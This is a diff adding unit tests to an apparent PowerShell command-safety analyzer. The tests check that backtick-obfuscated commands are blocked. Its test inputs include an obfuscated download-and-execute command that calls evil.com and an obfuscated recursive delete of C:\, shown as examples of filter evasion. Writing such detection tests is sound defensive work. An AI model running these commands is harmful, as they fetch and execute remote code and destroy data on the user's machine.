@@ -119,4 +119,16 @@ describe('PowerShellASTAnalyzer Unit Tests', () => {
       expect(res.isSafe).toBe(false);
     });
   });
+
+  describe('Backtick De-obfuscation Evasion Defense', () => {
+    it('blocks backtick-obfuscated Invoke-Expression and WebRequest', () => {
+      const res = analyzer.analyzeCommand('In`voke-Exp`ression (New-Object Net.Web`Client).Down`loadString("http://evil.com")');
+      expect(res.isSafe).toBe(false);
+    });
+
+    it('blocks backtick-obfuscated Remove-Item alias and parameters', () => {
+      const res = analyzer.analyzeCommand('r`m -r`ecurse C:\\');
+      expect(res.isSafe).toBe(false);
+    });
+  });
 });
